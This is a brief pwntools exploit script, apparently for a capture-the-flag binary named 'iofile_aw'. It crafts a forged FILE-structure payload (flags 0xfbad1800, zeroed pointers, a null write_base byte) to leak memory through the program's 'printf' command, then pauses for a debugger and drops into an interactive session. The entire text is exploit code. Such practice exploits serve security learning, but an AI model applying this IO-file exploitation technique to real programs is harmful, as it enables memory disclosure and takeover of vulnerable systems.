from pwn import *

p = process('iofile_aw')
payload = p64(0xfbad1800)
payload += p64(0)*3
payload += '\x00' #write_base
p.sendlineafter('# ', 'printf ' + payload)
p.sendlineafter('# ', 'help')
raw_input('debug: ' + str(p.pid))
p.interactive()

